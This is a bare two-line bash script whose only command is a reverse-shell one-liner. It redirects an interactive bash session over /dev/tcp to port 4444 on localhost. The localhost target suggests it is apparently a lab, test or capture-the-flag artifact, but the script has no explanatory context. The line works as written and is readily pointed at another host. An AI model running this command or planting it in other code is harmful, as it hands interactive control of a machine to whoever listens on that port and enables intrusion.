#!/bin/bash
	
bash -i >& /dev/tcp/localhost/4444 0>&1
